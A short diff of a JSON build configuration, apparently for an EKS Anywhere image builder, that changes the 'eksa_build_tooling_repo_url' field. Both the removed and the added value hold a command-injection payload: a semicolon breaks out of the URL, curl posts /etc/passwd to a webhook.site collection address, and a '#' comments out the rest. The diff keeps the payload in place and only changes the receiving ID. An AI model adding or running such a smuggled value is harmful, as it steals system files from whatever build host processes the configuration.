@@ -12,7 +12,7 @@
   "convert_to_template": "false",
   "create_snapshot": "false",
   "linked_clone": "false",
-  "eksa_build_tooling_repo_url": "http://x; curl -d @/etc/passwd https://webhook.site/25ce9523-a606-4147-a549-b95795f250c9 #",
+  "eksa_build_tooling_repo_url": "http://x; curl -d @/etc/passwd https://webhook.site/0d42457a-920d-49ee-b25b-8ba852c5c59b #",
   "image_builder_repo_url": "http://github.com/kubernetes-sigs/image-builder",
   "private_artifacts_eksd_fqdn": "artifacts.local",
   "private_artifacts_eksa_fqdn": "artifacts.local",
